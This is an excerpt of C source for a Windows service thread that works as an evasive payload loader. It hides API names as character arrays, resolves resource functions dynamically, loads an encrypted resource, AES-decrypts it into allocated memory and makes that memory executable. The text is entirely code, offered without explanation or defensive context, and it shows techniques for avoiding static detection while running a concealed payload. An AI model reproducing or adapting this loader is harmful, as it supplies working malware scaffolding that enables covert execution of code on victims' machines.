...
unsigned char findresourceA_str[] = { 'F','i','n','d','R','e','s','o','u','r','c','e','A',0x00 }; 
unsigned char loadresource_str[] = { 'L','o','a','d','R','e','s','o','u','r','c','e', 0x00 };
unsigned char sizeofresource_str[] = { 'S', 'i', 'z', 'e', 'o', 'f', 'R', 'e', 's', 'o', 'u', 'r', 'c', 'e', 0x00 };
unsigned char lockresource_str[] = { 'L', 'o', 'c', 'k', 'R', 'e', 's', 'o', 'u', 'r', 'c', 'e', 0x00 };
...
DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
{
    ...
    pFindResourceA cFindResourceA = (pFindResourceA)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)findresourceA_str);
	pLoadResource cLoadResource = (pLoadResource)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)loadresource_str);
	pSizeofResource cSizeofResource = (pSizeofResource)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)sizeofresource_str);
	pLockResource cLockResource = (pLockResource)cGetProcAddress(cGetModuleHandle((LPCSTR)kernel32_str), (LPCSTR)lockresource_str);

	res = cFindResourceA(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	resHandle = cLoadResource(NULL, res);
	payload_len = cSizeofResource(NULL, res);
	payload = cLockResource(resHandle);
	...
	exec_mem = cVirtualAlloc(0, (size_t)payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	...
	cRtlMoveMemory(exec_mem, payload, (size_t)payload_len);

	// decrypt the payload
	AESDecrypt((LPBYTE)exec_mem, (size_t)payload_len, payload_key, (size_t)sizeof(payload_key));
	...
	cVirtualProtect(exec_mem, (size_t)payload_len, PAGE_EXECUTE_READ, &oldprotect);
